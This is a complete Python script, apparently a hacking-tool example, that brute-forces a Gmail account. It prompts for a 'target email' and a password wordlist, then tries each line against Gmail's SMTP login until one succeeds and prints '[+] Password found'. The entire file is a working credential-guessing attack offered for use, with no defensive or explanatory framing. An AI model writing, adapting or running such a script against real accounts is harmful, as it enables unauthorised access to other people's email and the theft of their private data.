#!/usr/bin/python3
# -*- coding: utf-8 -*-

from termcolor import colored
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("[*] Enter target email: ")
passwdfile =input("[*] Enter the path to the password file: ")
file = open(passwdfile, "r")

for password in file:
    password = password.strip('\n')
    try:
        smtpserver.login(user, password)
        print("[+] Password found: %s" % password)
        break
    except smtplib.SMTPAuthenticationError:
        print("[-] Wrong password: " + password)
